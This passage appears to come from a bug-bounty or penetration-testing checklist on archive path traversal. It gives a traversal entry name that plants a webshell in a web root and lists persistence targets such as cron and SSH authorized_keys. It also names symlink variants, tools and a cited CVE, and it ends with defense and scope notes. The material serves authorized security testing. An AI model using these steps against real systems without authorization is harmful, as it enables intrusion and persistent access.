- [ ] Create an archive with traversal entry names: `../../../../var/www/html/shell.php`
- [ ] Write targets: webroot (webshell), cron, `~/.ssh/authorized_keys`, configs, autostart
- [ ] Symlink variants in TAR; Windows: `..\\..\\`
- [ ] Confirm a write outside the extraction directory
- [ ] Real case: **CVE-2024-57726** (SimpleHelp), added to CISA KEV (Jan 2025)

**Tools:** `evilarc`, `slipit`, manual archive assembly
**Defense (for the report):** canonicalize and verify that the resulting path is inside the target directory; reject `../` and absolute paths in entry names; do not trust names from the archive

---

> ⚠️ **Scope.** RCE vectors (LaTeX `\write18`, file upload shells, Java RMI/JMX, XSLT extensions, dependency confusion with a real payload), DoS (ReDoS, decompression bombs) and mass brute-forcing are destructive/heavy. Only within authorized scope; many programs prohibit DoS, RCE exploitation without approval, and mass account creation. Test dependency confusion and prompt injection with the safest possible probes (OAST/canaries), without a malicious payload.
